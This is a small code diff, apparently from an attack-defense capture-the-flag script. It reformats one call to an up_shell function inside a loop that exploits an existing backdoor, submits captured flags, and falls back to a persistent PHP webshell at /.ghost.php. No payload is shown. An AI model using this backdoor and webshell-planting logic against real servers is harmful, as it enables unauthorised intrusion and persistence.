@@ -156,7 +156,7 @@ def main():
             flag = backdoor_attack(ip, url_path, method, payload)
             if flag != False:
                 submit(ip, flag)
-                up_shell(ip,url_path,'get','copyright')
+                up_shell(ip, url_path, 'get', 'copyright')
                 save_txt(flag)
             else:  # 原有后门异常后尝试利用不死马
                 udshell_path = '/.ghost.php'
